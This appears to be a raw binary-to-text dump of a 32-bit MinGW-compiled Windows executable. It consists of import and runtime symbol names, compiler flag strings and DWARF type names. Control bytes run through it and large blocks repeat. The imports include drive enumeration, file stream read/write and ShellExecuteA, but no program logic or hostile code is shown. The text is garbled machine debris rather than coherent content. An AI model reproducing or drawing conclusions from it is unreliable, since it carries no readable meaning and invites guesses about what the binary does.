GetLocalTimeJGetLogicalDriveStringsAJGetModuleFileNameAJGetModuleHandleAJGetModuleHandleWJGetPriorityClassJGetProcAddressJGetStartupInfoAJGetSystemDirectoryAJGetSystemInfoJGetTickCountJInitializeCriticalSectionJLeaveCriticalSectionJLoadLibraryAJSetUnhandledExceptionFilterJSleepJTlsGetValueJVirtualProtectJVirtualQueryJ__getmainargsJ	__initenvJ__p__acmdlnJ__p__commodeJ
+__p__fmodeJ__set_app_typeJ__setusermatherrJ
+_amsg_exitJ_cexitJ_errnoJ	_inittermJ_iobJ
+_ismbbleadJ_onexitJ
+_vsnprintfJabortJcallocJexitJfprintfJfreeJfwriteJmallocJmemcpyJmemsetJrandJreallocJsignalJsrandJstrcatJstrcmpJstrcpyJstrlenJstrncmpJvfprintfJtimeJ_itoaJShellExecuteAJ_Unwind_ResumeJ__deregister_frame_infoJ__register_frame_infoJ_ZNSi4readEPciJ_ZNSi5seekgExSt12_Ios_SeekdirJ_ZNSi5tellgEvJ_ZNSo5writeEPKciJ2_ZNSt14basic_ifstreamIcSt11char_traitsIcEE5closeEvJA_ZNSt14basic_ifstreamIcSt11char_traitsIcEEC1EPKcSt13_Ios_OpenmodeJ._ZNSt14basic_ifstreamIcSt11char_traitsIcEED1EvJ2_ZNSt14basic_ofstreamIcSt11char_traitsIcEE5closeEvJA_ZNSt14basic_ofstreamIcSt11char_traitsIcEEC1EPKcSt13_Ios_OpenmodeJ._ZNSt14basic_ofstreamIcSt11char_traitsIcEED1EvJ7_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKcJ__gxx_personality_v0JADVAPI32.dllJKERNEL32.dllJ
+msvcrt.dllJSHELL32.dllJlibgcc_s_dw2-1.dllJlibstdc++-6.dllJÌ5GNU C17 13-win32 -mno-omit-leaf-frame-pointer -m32 -masm=att -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJunsigned intJ	uintptr_tJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJ_EXCEPTION_RECORDJExceptionCodeJExceptionFlagsJExceptionAddressJNumberParametersJExceptionInformationJ	7_CONTEXTJContextFlagsJ	FloatSaveJSegEsJEFlagsJSegSsJExtendedRegistersJDWORDJfloatJ__globallocalestatusJsigned charJ	short intJlong long unsigned intJLONG_PTRJ	ULONG_PTRJ	ULONGLONGJEXCEPTION_ROUTINEJPEXCEPTION_ROUTINEJ_FLOATING_SAVE_AREAJControlWordJ
+StatusWordJTagWordJErrorOffsetJErrorSelectorJ
+DataOffsetJDataSelectorJRegisterAreaJCr0NpxStateJFLOATING_SAVE_AREAJCONTEXTJPCONTEXTJEXCEPTION_RECORDJPEXCEPTION_RECORDJ_EXCEPTION_POINTERSJContextRecordJEXCEPTION_POINTERSJ_EXCEPTION_REGISTRATION_RECORDJHandlerJhandlerJ	FiberDataJVersionJExceptionListJ	StackBaseJ
+StackLimitJSubSystemTibJArbitraryUserPointerJPNT_TIBJ"*JOB_OBJECT_NET_RATE_CONTROL_FLAGSJ"JOB_OBJECT_NET_RATE_CONTROL_ENABLEJ)JOB_OBJECT_NET_RATE_CONTROL_MAX_BANDWIDTHJ$JOB_OBJECT_NET_RATE_CONTROL_DSCP_TAGJ'JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGSJ_IMAGE_DOS_HEADERJe_magicJ	e_cparhdrJ
+e_minallocJ
+e_maxallocJe_resJ	e_oeminfoJe_lfanewJIMAGE_DOS_HEADERJPIMAGE_DOS_HEADERJ_IMAGE_FILE_HEADERJMachineJNumberOfSectionsJTimeDateStampJPointerToSymbolTableJNumberOfSymbolsJSizeOfOptionalHeaderJCharacteristicsJIMAGE_FILE_HEADERJ_IMAGE_DATA_DIRECTORYJVirtualAddressJIMAGE_DATA_DIRECTORYJ_IMAGE_OPTIONAL_HEADERJMagicJ
+BaseOfDataJIMAGE_OPTIONAL_HEADER32JPIMAGE_OPTIONAL_HEADER32J_IMAGE_OPTIONAL_HEADER64JMagicJPIMAGE_OPTIONAL_HEADER64J_IMAGE_NT_HEADERSJ	SignatureJ
+FileHeaderJOptionalHeaderJPIMAGE_NT_HEADERS32JPIMAGE_NT_HEADERSJPIMAGE_TLS_CALLBACKJPTOP_LEVEL_EXCEPTION_FILTERJLPTOP_LEVEL_EXCEPTION_FILTERJ	_onexit_tJdoubleJlong doubleJ_invalid_parameter_handlerJ<tagCOINITBASEJCOINITBASE_MULTITHREADEDJ*VARENUMJVT_EMPTYJVT_NULLJVT_DATEJVT_DISPATCHJVT_ERRORJVT_BOOLJ
+VT_VARIANTJ
+VT_UNKNOWNJ
+VT_DECIMALJVT_INTJVT_UINTJ
+VT_HRESULTJVT_SAFEARRAYJ	VT_CARRAYJVT_USERDEFINEDJVT_LPSTRJ	VT_RECORDJ
+VT_INT_PTRJVT_UINT_PTRJVT_FILETIMEJ	VT_STREAMJ
+VT_STORAGEJVT_STREAMED_OBJECTJVT_STORED_OBJECTJVT_BLOB_OBJECTJVT_CLSIDJVT_VERSIONED_STREAMJVT_BSTR_BLOBJ	VT_VECTORJVT_ARRAYJVT_BYREFJVT_RESERVEDJ
+VT_ILLEGALJVT_ILLEGALMASKEDJVT_TYPEMASKJ_dowildcardJ_newmodeJ_imp____initenvJnewmodeJ_startupinfoJ__uninitializedJ__initializingJ__initializedJ__native_startup_stateJ__native_startup_lockJA_exceptionJretvalJ_TCHARJ_image_base__J_commodeJ__dyn_tls_init_callbackJ__mingw_app_typeJBargretJmainretJ
+managedappJ	has_cctorJ	startinfoJ__mingw_oldexcpt_handlerJ-__mingw_pcinitJ-__mingw_pcppinitJ_MINGW_INSTALL_DEBUG_MATHERRJ#__mingw_initltsdrot_forceJ#__mingw_initltsdyn_forceJ#__mingw_initltssuo_forceJC__mingw_module_is_dllJ$_onexitJstrlenJ$mallocJC DexitJ__mainJ_fpresetJ_set_invalid_parameter_handlerJ._gnu_exception_handlerJ_gnu_exception_handler@4J.SetUnhandledExceptionFilterJ4SetUnhandledExceptionFilter@4J_pei386_runtime_relocatorJ	_inittermJ
+_amsg_exitJ__getmainargsJ	$_matherrJ__mingw_setusermatherrJ	%_setargvJ%__p__commodeJ%__p__fmodeJ__set_app_typeJFatexitJHduplicate_ppstringsJJcheck_managed_appJpDOSHeaderJ
+pPEHeaderJpNTHeader32JpNTHeader64J/__tmainCRTStartupJ
+&lock_freeJ&fiberidJ&nestedJ1mainCRTStartupJ1WinMainCRTStartupJ4pre_cpp_initJ/pre_c_initJ 4__mingw_invalidParameterHandlerJ
+expressionJfunctionJ	pReservedJRNtCurrentTebJ)__readfsdwordJOffsetJ)_InterlockedExchangePointerJTargetJValueJ)_InterlockedCompareExchangeJDestinationJExChangeJ	ComperandJ__builtin_memcpyJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJunsigned intJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJDWORDJfloatJsigned charJ	short intJlong long unsigned intJHANDLEJ_IMAGE_DOS_HEADERJe_magicJ	e_cparhdrJ
+e_minallocJ
+e_maxallocJe_resJ	e_oeminfoJe_lfanewJIMAGE_DOS_HEADERJHINSTANCE__JunusedJ	HINSTANCEJ_STARTUPINFOAJ
+lpReservedJ	lpDesktopJlpTitleJdwYSizeJdwXCountCharsJdwYCountCharsJdwFillAttributeJdwFlagsJwShowWindowJcbReserved2JlpReserved2J	hStdInputJ
+hStdOutputJ	hStdErrorJSTARTUPINFOAJLPSTARTUPINFOAJSTARTUPINFOJdoubleJlong doubleJ_TCHARJ_image_base__JWinMainJ
+WinMain@16JGetStartupInfoAJGetStartupInfoA@4JmemsetJ
+_ismbbleadJ__p__acmdlnJ	hInstanceJ	lpCmdLineJinDoubleQuoteJStartupInfoJ__mainJ__mainJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJunsigned intJ	ptrdiff_tJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJfloatJsigned charJ	short intJlong long unsigned intJ!JOB_OBJECT_NET_RATE_CONTROL_FLAGSJ"JOB_OBJECT_NET_RATE_CONTROL_ENABLEJ)JOB_OBJECT_NET_RATE_CONTROL_MAX_BANDWIDTHJ$JOB_OBJECT_NET_RATE_CONTROL_DSCP_TAGJ'JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGSJdoubleJlong doubleJtagCOINITBASEJCOINITBASE_MULTITHREADEDJVARENUMJVT_EMPTYJVT_NULLJVT_DATEJVT_DISPATCHJVT_ERRORJVT_BOOLJ
+VT_VARIANTJ
+VT_UNKNOWNJ
+VT_DECIMALJVT_INTJVT_UINTJ
+VT_HRESULTJVT_SAFEARRAYJ	VT_CARRAYJVT_USERDEFINEDJVT_LPSTRJ	VT_RECORDJ
+VT_INT_PTRJVT_UINT_PTRJVT_FILETIMEJ	VT_STREAMJ
+VT_STORAGEJVT_STREAMED_OBJECTJVT_STORED_OBJECTJVT_BLOB_OBJECTJVT_CLSIDJVT_VERSIONED_STREAMJVT_BSTR_BLOBJ	VT_VECTORJVT_ARRAYJVT_BYREFJVT_RESERVEDJ
+VT_ILLEGALJVT_ILLEGALMASKEDJVT_TYPEMASKJfunc_ptrJ__CTOR_LIST__J__DTOR_LIST__J	initializedJatexitJ__mainJ
+__do_global_ctorsJ
+__do_global_dtorsJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJunsigned intJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJfloatJsigned charJ	short intJlong long unsigned intJ!JOB_OBJECT_NET_RATE_CONTROL_FLAGSJ"JOB_OBJECT_NET_RATE_CONTROL_ENABLEJ)JOB_OBJECT_NET_RATE_CONTROL_MAX_BANDWIDTHJ$JOB_OBJECT_NET_RATE_CONTROL_DSCP_TAGJ'JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGSJdoubleJlong doubleJ	tagCOINITBASEJCOINITBASE_MULTITHREADEDJVARENUMJVT_EMPTYJVT_NULLJVT_DATEJVT_DISPATCHJVT_ERRORJVT_BOOLJ
+VT_VARIANTJ
+VT_UNKNOWNJ
+VT_DECIMALJVT_INTJVT_UINTJ
+VT_HRESULTJVT_SAFEARRAYJ	VT_CARRAYJVT_USERDEFINEDJVT_LPSTRJ	VT_RECORDJ
+VT_INT_PTRJVT_UINT_PTRJVT_FILETIMEJ	VT_STREAMJ
+VT_STORAGEJVT_STREAMED_OBJECTJVT_STORED_OBJECTJVT_BLOB_OBJECTJVT_CLSIDJVT_VERSIONED_STREAMJVT_BSTR_BLOBJ	VT_VECTORJVT_ARRAYJVT_BYREFJVT_RESERVEDJ
+VT_ILLEGALJVT_ILLEGALMASKEDJVT_TYPEMASKJ__uninitializedJ__initializingJ__initializedJ__native_startup_stateJ__native_startup_lockJ__native_dllmain_reasonJ__native_vcclrit_reasonJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJ_dowildcardJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJunsigned intJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJfloatJsigned charJ	short intJlong long unsigned intJdoubleJlong doubleJ_setargvJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJ_newmodeJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJunsigned intJ	uintptr_tJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJULONGJWINBOOLJDWORDJfloatJsigned charJ	short intJlong long unsigned intJ	ULONG_PTRJHANDLEJ!JOB_OBJECT_NET_RATE_CONTROL_FLAGSJ#
+JOB_OBJECT_NET_RATE_CONTROL_ENABLEJ*
+JOB_OBJECT_NET_RATE_CONTROL_MAX_BANDWIDTHJ%
+JOB_OBJECT_NET_RATE_CONTROL_DSCP_TAGJ(
+JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGSJPIMAGE_TLS_CALLBACKJ_IMAGE_TLS_DIRECTORY32JStartAddressOfRawDataJEndAddressOfRawDataJAddressOfIndexJAddressOfCallBacksJSizeOfZeroFillJCharacteristicsJIMAGE_TLS_DIRECTORY32JIMAGE_TLS_DIRECTORYJdoubleJlong doubleJ
+_tls_indexJ
+_tls_startJ_tls_endJ	_tls_usedJ__dyn_tls_init_callbackJ__mingw_initltsdrot_forceJ__mingw_initltsdyn_forceJ__mingw_initltssuo_forceJ__mingw_TLScallbackJ__dyn_tls_dtorJ__tlregdtorJ__dyn_tls_initJ__dyn_tls_init@12J__dyn_tls_init@12JËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJ_commodeJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJunsigned intJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJdoubleJunsigned intJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJlong long unsigned intJfloatJlong doubleJ
+_exceptionJretvalJ_baseJ_fileJ_charbufJ	_tmpfnameJ
+FILEJfprintfJ__acrt_iob_funcJ_matherrJpexceptJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJ_fpresetJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJ__mingw_app_typeJÌ&GNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJlong long unsigned intJunsigned intJ__gnuc_va_listJ__builtin_va_listJva_listJ	ptrdiff_tJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJULONGJWINBOOLJDWORDJfloatJPDWORDJsigned charJ	short intJ	ULONG_PTRJ!JOB_OBJECT_NET_RATE_CONTROL_FLAGSJ"JOB_OBJECT_NET_RATE_CONTROL_ENABLEJ)JOB_OBJECT_NET_RATE_CONTROL_MAX_BANDWIDTHJ$JOB_OBJECT_NET_RATE_CONTROL_DSCP_TAGJ'JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGSJ_MEMORY_BASIC_INFORMATIONJBaseAddressJAllocationBaseJAllocationProtectJ
+RegionSizeJStateJProtectJMEMORY_BASIC_INFORMATIONJPMEMORY_BASIC_INFORMATIONJ_IMAGE_DOS_HEADERJe_magicJ	e_cparhdrJ
+e_minallocJ
+e_maxallocJe_resJ	e_oeminfoJe_lfanewJIMAGE_DOS_HEADERJPhysicalAddressJVirtualSizeJ_IMAGE_SECTION_HEADERJVirtualAddressJSizeOfRawDataJPointerToRawDataJPointerToRelocationsJPointerToLinenumbersJNumberOfRelocationsJNumberOfLinenumbersJCharacteristicsJPIMAGE_SECTION_HEADERJdoubleJlong doubleJ,tagCOINITBASEJCOINITBASE_MULTITHREADEDJVARENUMJVT_EMPTYJVT_NULLJVT_DATEJVT_DISPATCHJVT_ERRORJVT_BOOLJ
+VT_VARIANTJ
+VT_UNKNOWNJ
+VT_DECIMALJVT_INTJVT_UINTJ
+VT_HRESULTJVT_SAFEARRAYJ	VT_CARRAYJVT_USERDEFINEDJVT_LPSTRJ	VT_RECORDJ
+VT_INT_PTRJVT_UINT_PTRJVT_FILETIMEJ	VT_STREAMJ
+VT_STORAGEJVT_STREAMED_OBJECTJVT_STORED_OBJECTJVT_BLOB_OBJECTJVT_CLSIDJVT_VERSIONED_STREAMJVT_BSTR_BLOBJ	VT_VECTORJVT_ARRAYJVT_BYREFJVT_RESERVEDJ
+VT_ILLEGALJVT_ILLEGALMASKEDJVT_TYPEMASKJ_baseJ_fileJ_charbufJ	_tmpfnameJ__RUNTIME_PSEUDO_RELOC_LIST__J!__RUNTIME_PSEUDO_RELOC_LIST_END__J_image_base__JaddendJtargetJruntime_pseudo_reloc_item_v1JtargetJflagsJruntime_pseudo_reloc_item_v2JversionJruntime_pseudo_reloc_v2Jold_protectJbase_addressJregion_sizeJ	sec_startJthe_secsJmaxSectionsJ0GetLastErrorJGetLastError@0JVirtualProtectJVirtualProtect@16JVirtualQueryJVirtualQuery@12J_GetPEImageBaseJ__mingw_GetSectionForAddressJ
+(2vfprintfJ__acrt_iob_funcJ__mingw_GetSectionCountJ3_pei386_runtime_relocatorJ	4was_initJ#do_pseudo_relocJstartJaddr_impJreldataJreloc_targetJmax_unsignedJ
+min_signedJ#__write_memoryJ?restore_modified_sectionsJ%oldprotJ@mark_section_writableJnew_protectJC__report_errorJFfwriteJ__builtin_fwriteJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJunsigned intJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJdoubleJlong long unsigned intJfloatJlong doubleJ	_exceptionJretvalJ
+fUserMathErrJstUserMathErrJ__setusermatherrJ__mingw_setusermatherrJ__mingw_raise_matherrJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJunsigned intJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJ_EXCEPTION_RECORDJExceptionCodeJExceptionFlagsJExceptionAddressJNumberParametersJExceptionInformationJ_CONTEXTJContextFlagsJ	FloatSaveJSegEsJEFlagsJSegSsJExtendedRegistersJ	DWORDJfloatJsigned charJ	short intJlong long unsigned intJ
+	ULONG_PTRJ_FLOATING_SAVE_AREAJControlWordJ
+StatusWordJTagWordJErrorOffsetJErrorSelectorJ
+DataOffsetJDataSelectorJRegisterAreaJCr0NpxStateJFLOATING_SAVE_AREAJCONTEXTJPCONTEXTJEXCEPTION_RECORDJPEXCEPTION_RECORDJ_EXCEPTION_POINTERSJContextRecordJEXCEPTION_POINTERSJ!JOB_OBJECT_NET_RATE_CONTROL_FLAGSJ"JOB_OBJECT_NET_RATE_CONTROL_ENABLEJ)JOB_OBJECT_NET_RATE_CONTROL_MAX_BANDWIDTHJ$JOB_OBJECT_NET_RATE_CONTROL_DSCP_TAGJ'JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGSJ	PTOP_LEVEL_EXCEPTION_FILTERJ	LPTOP_LEVEL_EXCEPTION_FILTERJdoubleJlong doubleJtagCOINITBASEJCOINITBASE_MULTITHREADEDJVARENUMJVT_EMPTYJVT_NULLJVT_DATEJVT_DISPATCHJVT_ERRORJVT_BOOLJ
+VT_VARIANTJ
+VT_UNKNOWNJ
+VT_DECIMALJVT_INTJVT_UINTJ
+VT_HRESULTJVT_SAFEARRAYJ	VT_CARRAYJVT_USERDEFINEDJVT_LPSTRJ	VT_RECORDJ
+VT_INT_PTRJVT_UINT_PTRJVT_FILETIMEJ	VT_STREAMJ
+VT_STORAGEJVT_STREAMED_OBJECTJVT_STORED_OBJECTJVT_BLOB_OBJECTJVT_CLSIDJVT_VERSIONED_STREAMJVT_BSTR_BLOBJ	VT_VECTORJVT_ARRAYJVT_BYREFJVT_RESERVEDJ
+VT_ILLEGALJVT_ILLEGALMASKEDJVT_TYPEMASKJ	__p_sig_fn_tJ__mingw_oldexcpt_handlerJ_fpresetJsignalJ_gnu_exception_handlerJ_gnu_exception_handler@4Jexception_dataJold_handlerJactionJ
+reset_fpuJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJunsigned intJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJWINBOOLJDWORDJfloatJsigned charJ	short intJlong long unsigned intJ	ULONG_PTRJHANDLEJ_LIST_ENTRYJFlinkJBlinkJ
+LIST_ENTRYJ!JOB_OBJECT_NET_RATE_CONTROL_FLAGSJ"JOB_OBJECT_NET_RATE_CONTROL_ENABLEJ)JOB_OBJECT_NET_RATE_CONTROL_MAX_BANDWIDTHJ$JOB_OBJECT_NET_RATE_CONTROL_DSCP_TAGJ'JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGSJ_RTL_CRITICAL_SECTION_DEBUGJCreatorBackTraceIndexJCriticalSectionJProcessLocksListJ
+EntryCountJContentionCountJFlagsJCreatorBackTraceIndexHighJ	SpareWORDJ_RTL_CRITICAL_SECTIONJ	DebugInfoJ	LockCountJRecursionCountJOwningThreadJLockSemaphoreJ	SpinCountJPRTL_CRITICAL_SECTION_DEBUGJRTL_CRITICAL_SECTIONJPRTL_CRITICAL_SECTIONJCRITICAL_SECTIONJLPCRITICAL_SECTIONJdoubleJlong doubleJ__mingwthr_csJ__mingwthr_cs_initJ__mingwthr_key_tJ__mingwthr_keyJkey_dtor_listJGetLastErrorJGetLastError@0JTlsGetValueJTlsGetValue@4J_fpresetJDeleteCriticalSectionJ.DeleteCriticalSection@4JInitializeCriticalSectionJpInitializeCriticalSection@4JLeaveCriticalSectionJ,LeaveCriticalSection@4JEnterCriticalSectionJ+EnterCriticalSection@4J!callocJ__mingw_TLScallbackJ
+hDllHandleJreasonJ	reservedJ&__mingwthr_run_key_dtorsJvalueJ___w64_mingwthr_remove_key_dtorJ		prev_keyJ___w64_mingwthr_add_key_dtorJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJ!__RUNTIME_PSEUDO_RELOC_LIST_END__J__RUNTIME_PSEUDO_RELOC_LIST__JÌ GNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJunsigned intJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJ
+WINBOOLJ
+DWORDJfloatJsigned charJ	short intJlong long unsigned intJ
+
+ULONG_PTRJ
+
+DWORD_PTRJ_IMAGE_DOS_HEADERJe_magicJ	e_cparhdrJ
+e_minallocJ
+e_maxallocJe_resJ	e_oeminfoJe_lfanewJIMAGE_DOS_HEADERJPIMAGE_DOS_HEADERJ_IMAGE_FILE_HEADERJMachineJNumberOfSectionsJPointerToSymbolTableJNumberOfSymbolsJSizeOfOptionalHeaderJIMAGE_FILE_HEADERJ_IMAGE_DATA_DIRECTORYJIMAGE_DATA_DIRECTORYJ_IMAGE_OPTIONAL_HEADERJMagicJMajorLinkerVersionJMinorLinkerVersionJ
+SizeOfCodeJSizeOfInitializedDataJSizeOfUninitializedDataJAddressOfEntryPointJ
+BaseOfCodeJ
+BaseOfDataJ	ImageBaseJSectionAlignmentJFileAlignmentJMajorOperatingSystemVersionJMinorOperatingSystemVersionJMajorImageVersionJMinorImageVersionJMajorSubsystemVersionJMinorSubsystemVersionJWin32VersionValueJSizeOfImageJSizeOfHeadersJCheckSumJ	SubsystemJDllCharacteristicsJSizeOfStackReserveJSizeOfStackCommitJSizeOfHeapReserveJSizeOfHeapCommitJLoaderFlagsJNumberOfRvaAndSizesJDataDirectoryJIMAGE_OPTIONAL_HEADER32JPIMAGE_OPTIONAL_HEADER32JPIMAGE_OPTIONAL_HEADERJ_IMAGE_NT_HEADERSJ	SignatureJ
+FileHeaderJOptionalHeaderJPIMAGE_NT_HEADERS32JPIMAGE_NT_HEADERSJPhysicalAddressJVirtualSizeJ_IMAGE_SECTION_HEADERJSizeOfRawDataJPointerToRawDataJPointerToRelocationsJPointerToLinenumbersJNumberOfRelocationsJNumberOfLinenumbersJPIMAGE_SECTION_HEADERJOriginalFirstThunkJ_IMAGE_IMPORT_DESCRIPTORJForwarderChainJ
+FirstThunkJIMAGE_IMPORT_DESCRIPTORJPIMAGE_IMPORT_DESCRIPTORJdoubleJlong doubleJ%_image_base__JstrlenJ!__mingw_enum_import_library_namesJ
+importDescJimportsStartRVAJ_IsNonwritableInCurrentImageJpTargetJ	rvaTargetJ_GetPEImageBaseJ_FindPESectionExecJ__mingw_GetSectionCountJ__mingw_GetSectionForAddressJ_FindPESectionByNameJ_FindPESectionJ_ValidateImageBaseJ
+pDOSHeaderJ
+pOptHeaderJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJ_MINGW_INSTALL_DEBUG_MATHERRJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJ__gnuc_va_listJ__builtin_va_listJva_listJunsigned intJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJfloatJsigned charJ	short intJlong long unsigned intJ!JOB_OBJECT_NET_RATE_CONTROL_FLAGSJ"JOB_OBJECT_NET_RATE_CONTROL_ENABLEJ)JOB_OBJECT_NET_RATE_CONTROL_MAX_BANDWIDTHJ$JOB_OBJECT_NET_RATE_CONTROL_DSCP_TAGJ'JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGSJdoubleJlong doubleJtagCOINITBASEJCOINITBASE_MULTITHREADEDJVARENUMJVT_EMPTYJVT_NULLJVT_DATEJVT_DISPATCHJVT_ERRORJVT_BOOLJ
+VT_VARIANTJ
+VT_UNKNOWNJ
+VT_DECIMALJVT_INTJVT_UINTJ
+VT_HRESULTJVT_SAFEARRAYJ	VT_CARRAYJVT_USERDEFINEDJVT_LPSTRJ	VT_RECORDJ
+VT_INT_PTRJVT_UINT_PTRJVT_FILETIMEJ	VT_STREAMJ
+VT_STORAGEJVT_STREAMED_OBJECTJVT_STORED_OBJECTJVT_BLOB_OBJECTJVT_CLSIDJVT_VERSIONED_STREAMJVT_BSTR_BLOBJ	VT_VECTORJVT_ARRAYJVT_BYREFJVT_RESERVEDJ
+VT_ILLEGALJVT_ILLEGALMASKEDJVT_TYPEMASKJ_imp__sprintf_sJ
+vsprintf_sJ	sprintf_sJ	_SizeJ	_FormatJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJunsigned intJ	uintptr_tJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJfloatJsigned charJ	short intJlong long unsigned intJ!JOB_OBJECT_NET_RATE_CONTROL_FLAGSJ"JOB_OBJECT_NET_RATE_CONTROL_ENABLEJ)JOB_OBJECT_NET_RATE_CONTROL_MAX_BANDWIDTHJ$JOB_OBJECT_NET_RATE_CONTROL_DSCP_TAGJ'JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGSJdoubleJlong doubleJ_invalid_parameter_handlerJtagCOINITBASEJCOINITBASE_MULTITHREADEDJVARENUMJVT_EMPTYJVT_NULLJVT_DATEJVT_DISPATCHJVT_ERRORJVT_BOOLJ
+VT_VARIANTJ
+VT_UNKNOWNJ
+VT_DECIMALJVT_INTJVT_UINTJ
+VT_HRESULTJVT_SAFEARRAYJ	VT_CARRAYJVT_USERDEFINEDJVT_LPSTRJ	VT_RECORDJ
+VT_INT_PTRJVT_UINT_PTRJVT_FILETIMEJ	VT_STREAMJ
